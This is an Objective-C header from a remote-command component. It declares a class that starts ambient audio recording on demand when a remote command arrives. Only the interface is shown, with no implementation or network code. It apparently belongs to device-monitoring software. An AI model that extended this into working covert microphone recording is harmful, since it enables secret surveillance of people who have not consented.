/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  OnDemandRecordProcessor
 - Version      :  1.0  
 - Purpose      :  Record audio
 - Copy right   :  29/11/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */

#import <Foundation/Foundation.h>
#import "RemoteCmdAsyncNonHTTPProcessor.h"
#import "AmbientRecordingManager.h"


@interface OnDemandRecordProcessor : RemoteCmdAsyncNonHTTPProcessor <AmbientRecordingDelegate> {

}


- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;

@end
